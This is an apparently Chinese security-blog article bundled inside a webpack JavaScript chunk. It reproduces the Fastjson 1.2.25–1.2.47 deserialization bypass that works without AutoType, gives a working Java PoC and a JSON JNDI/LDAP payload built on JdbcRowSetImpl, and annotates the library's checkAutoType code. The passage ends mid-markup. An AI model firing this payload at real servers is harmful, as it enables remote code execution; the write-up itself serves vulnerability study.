"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[786],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,t]of s)a[n]=t;return a}},5696:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>yn,data:()=>qn});var t=a(4754);const p=a.p+"assets/img/image-20240422173416-vsggag7.b54ceb14.png",o=a.p+"assets/img/net-img-1616544566230-20240424131540-g6bubin.0f117301.png",e=a.p+"assets/img/image-20240423101213-63i5htc.eed64414.png",c=a.p+"assets/img/image-20240423101441-mmhp2ey.eaaeea5f.png",l=a.p+"assets/img/image-20240423102219-ub5iifz.98028cf3.png",i=a.p+"assets/img/image-20240423095031-4cyn7vr.de7d0af9.png",u=a.p+"assets/img/image-20240423094403-vttqerb.c6b830a2.png",r=a.p+"assets/img/image-20240423094600-js5106w.98df61d1.png",k=a.p+"assets/img/image-20240423095557-gsc7gha.e37839a5.png",d=a.p+"assets/img/image-20240423102917-7dlzsdk.f136fad0.png",m=a.p+"assets/img/image-20240423103118-h5y3kcw.02ed65d0.png",v=a.p+"assets/img/image-20240423103505-krfqo2r.57c1e2b2.png",g=a.p+"assets/img/image-20240423103615-yalg1mw.79f41ab2.png",b=a.p+"assets/img/image-20240423103929-1odoh1z.6ba68a5b.png",y=a.p+"assets/img/image-20240423104215-3vl0k64.73dce8d3.png",q=a.p+"assets/img/image-20240423105119-7z5mig5.a6d17b92.png",f=a.p+"assets/img/image-20240423110409-zgjzpz4.1d00c2b5.png",h=a.p+"assets/img/image-20240423110737-w8grc04.b0e909b4.png",w=a.p+"assets/img/image-20240423111119-oiof7ul.ac48c012.png",j=a.p+"assets/img/image-20240423111153-cexe9nm.1dde95c6.png",C=a.p+"assets/img/image-20240423111323-u2o7vdf.c898feb3.png",S=a.p+"assets/img/image-20240423111655-ov57anp.4ae6b3c2.png",z=a.p+"assets/img/image-20240423112021-i4ioc37.3ccb94a1.png",x=a.p+"assets/img/image-20240423112801-28arl3n.16fcd988.png",N=a.p+"assets/img/image-20240423124932-wczda41.d8115b99.png",E=a.p+"assets/img/image-20240423125556-szcg2ec.cc8b37b2.png",T=a.p+"assets/img/image-20240423125719-xdzfv6u.a4801150.png",A=a.p+"assets/img/image-20240423130317-lrxl4mj.53f8f64e.png",J=a.p+"assets/img/image-20240423130432-76kinhn.0e809acb.png",I=a.p+"assets/img/image-20240423171413-1f568hv.877854fa.png",L=a.p+"assets/img/image-20240423134818-ci3aosc.c0420ec0.png",F=a.p+"assets/img/image-20240423135933-oq33nqm.29d23571.png",O=a.p+"assets/img/image-20240423140058-wg531j0.b86036bc.png",D=a.p+"assets/img/image-20240423135551-lxulyvn.f6dc5bcc.png",R=a.p+"assets/img/image-20240423150840-r91axl3.6075a39f.png",P=a.p+"assets/img/image-20240423151233-pj568f4.c7ac6031.png",B=a.p+"assets/img/image-20240423151522-zcc9you.5641f479.png",M=a.p+"assets/img/image-20240423161257-7868wqv.e6a95765.png",_=a.p+"assets/img/image-20240423154605-z3huozm.4b959c59.png",W=a.p+"assets/img/image-20240423154725-n5i34n4.9c4756a1.png",U=a.p+"assets/img/image-20240423163646-n2s4a1y.a49dfd32.png",H=a.p+"assets/img/image-20240423155719-xfgbp3z.026707a5.png",K=(0,t.Fv)('<h2 id="_1-2-25-1-2-47-反序列化漏洞-无需开启-autotype" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-47-反序列化漏洞-无需开启-autotype"><span>1.2.25 - 1.2.47 反序列化漏洞（无需开启 AutoType）</span></a></h2><p><strong>影响</strong>：Fastjson 1.2.x 系列的 1.2.25-1.2.47 版本</p><p><strong>限制</strong>：主要是 JDK 版本对于 JDNI 注入的限制，基于 RMI 利用的 JDK 版本 <code>&lt;=6u141、7u131、8u121</code>​，基于 LDAP 利用的 JDK 版本 <code>&lt;=6u211、7u201、8u191</code>​。</p><h3 id="复现利用" tabindex="-1"><a class="header-anchor" href="#复现利用"><span>复现利用</span></a></h3><p>前面讨论的都是开启 AutoType 的 <code>&lt;= 1.2.45</code>​ 的漏洞复现和利用。本次 Fastjson 反序列化漏洞也是基于 <code>checkAutoType()</code>​ 函数绕过的，并且无需开启 AutoTypeSupport，大大提高了成功利用的概率。</p><p>绕过的大体思路是通过 <code>java.lang.Class</code>​，将 JdbcRowSetImpl 类加载到 Map 中缓存，从而绕过 AutoType 的检测。<mark>因此将 payload 分两次发送，第一次加载，第二次执行。</mark></p><p>默认情况下，只要遇到没有加载到缓存的类，<code>checkAutoType()</code>​ 就会抛出异常终止程序。</p><p>Demo 如下，无需开启 AutoTypeSupport，本地 Fastjson 用的是 1.2.47 版本。还是那套流程，开启 RMI 服务或 LDAP 服务以及放置恶意类的 Web 服务。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;a\\&quot;:{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},&quot;</span>\n                <span class="token operator">+</span> <span class="token string">&quot;\\&quot;b\\&quot;:{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot;</span>\n                <span class="token operator">+</span> <span class="token string">&quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true}}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>这里，我们看看 poc 是怎么写的。</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>\n    <span class="token property">&quot;a&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>\n        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.lang.Class&quot;</span><span class="token punctuation">,</span>\n        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>\n    <span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token property">&quot;b&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>\n        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span>\n        <span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">,</span>\n        <span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到实际上还是利用了 <code>com.sun.rowset.JdbcRowSetImpl</code>​ 这条利用链来攻击利用的，因此除了 JDK 版本外几乎没有限制。</p><p>但是如果目标服务端开启了 AutoTypeSupport 呢？经测试发现：</p><ul><li><mark><strong>1.2.25-1.2.32 版本</strong></mark>：未开启 AutoTypeSupport 时能成功利用，开启 AutoTypeSupport 反而不能成功触发</li><li><strong><mark>1.2.33-1.2.47 版本</mark></strong>：无论是否开启 AutoTypeSupport，都能成功利用</li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code> <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> expectClass<span class="token punctuation">,</span> <span class="token keyword">int</span> features<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token comment">// 类名非空判断</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 类名长度判断，不大于 128 不小于 3</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">128</span> <span class="token operator">||</span> typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token class-name">String</span> className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">&#39;$&#39;</span><span class="token punctuation">,</span> <span class="token char">&#39;.&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>\n\n        <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">BASIC</span> <span class="token operator">=</span> <span class="token number">0</span>xcbf29ce484222325L<span class="token punctuation">;</span> <span class="token comment">//;</span>\n        <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">PRIME</span> <span class="token operator">=</span> <span class="token number">0</span>x100000001b3L<span class="token punctuation">;</span>  <span class="token comment">//L</span>\n\n        <span class="token keyword">final</span> <span class="token keyword">long</span> h1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BASIC</span> <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>\n        <span class="token comment">// 类名以 [ 开头抛出异常</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>h1 <span class="token operator">==</span> <span class="token number">0</span>xaf64164c86024f1aL<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// [</span>\n            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 类名以 L 开头以 ; 结尾抛出异常</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h1 <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">PRIME</span> <span class="token operator">==</span> <span class="token number">0</span>x9198507b5af98f0L<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">final</span> <span class="token keyword">long</span> h3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">BASIC</span> <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n                <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">)</span>\n                <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n                <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">)</span>\n                <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n                <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>\n        <span class="token comment">// autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">long</span> hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>\n            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                hash <span class="token operator">^=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                hash <span class="token operator">*=</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>\n                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n                    <span class="token punctuation">}</span>\n                <span class="token punctuation">}</span>\n                <span class="token comment">// 在对比 denyHashCodes 进行黑名单匹配</span>\n                <span class="token comment">// 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类</span>\n                <span class="token comment">// 则抛出异常</span>\n                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token comment">// 尝试在 TypeUtils.mappings 中查找缓存的 class</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token comment">// 尝试在 deserializers 中查找这个类</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            clazz <span class="token operator">=</span> deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token comment">// 如果找到了对应的 class，则会进行 return</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span>\n                    <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span>\n                    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;type not match. &quot;</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">&quot; -&gt; &quot;</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n\n            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token comment">// 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">long</span> hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>\n            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">char</span> c <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                hash <span class="token operator">^=</span> c<span class="token punctuation">;</span>\n                hash <span class="token operator">*=</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>\n\n                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n\n                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                        clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                    <span class="token punctuation">}</span>\n\n                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;type not match. &quot;</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">&quot; -&gt; &quot;</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                    <span class="token punctuation">}</span>\n\n                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span><span class="token class-name">JSONType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n\n            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">// classloader is danger</span>\n                    <span class="token operator">||</span> <span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">// dataSource can load jdbc driver</span>\n                    <span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>\n                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;type not match. &quot;</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">&quot; -&gt; &quot;</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n            <span class="token punctuation">}</span>\n\n            <span class="token class-name">JavaBeanInfo</span> beanInfo <span class="token operator">=</span> <span class="token class-name">JavaBeanInfo</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> propertyNamingStrategy<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>beanInfo<span class="token punctuation">.</span>creatorConstructor <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">final</span> <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportAutoType</span><span class="token punctuation">.</span>mask<span class="token punctuation">;</span>\n        <span class="token keyword">boolean</span> autoTypeSupport <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport\n                <span class="token operator">||</span> <span class="token punctuation">(</span>features <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>\n                <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_PARSER_FEATURE</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>\n\n        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 